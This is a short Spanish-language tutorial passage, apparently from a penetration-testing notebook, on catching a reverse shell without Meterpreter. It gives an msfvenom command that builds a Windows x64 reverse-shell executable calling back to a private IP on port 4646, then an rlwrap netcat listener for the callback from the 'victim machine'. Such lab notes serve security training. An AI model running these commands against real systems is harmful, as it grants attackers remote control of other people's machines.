
-------

Para ponerse en escucha sin utilizar el meterpreter de Metasploit, usaremos la herramienta de netcat. Primeramente, crearemos el payload staged, el cual servirá para el acceso a la máquina víctima de la siguiente forma:

```
msfvenom -p windows/shell/reverse_tcp --platform windows -a x64 LHOST=192.168.20.16 LPORT=4646 -f exe -o reverse.exe
```

Una vez generado el payload y ya instalado en la máquina víctima, lo que haremos es ponernos en escucha con netcat de la siguiente forma, usando la utilidad de [[rlwrap]] con netcat:

```bash 
rlwrap nc -nlvp 4646 
```

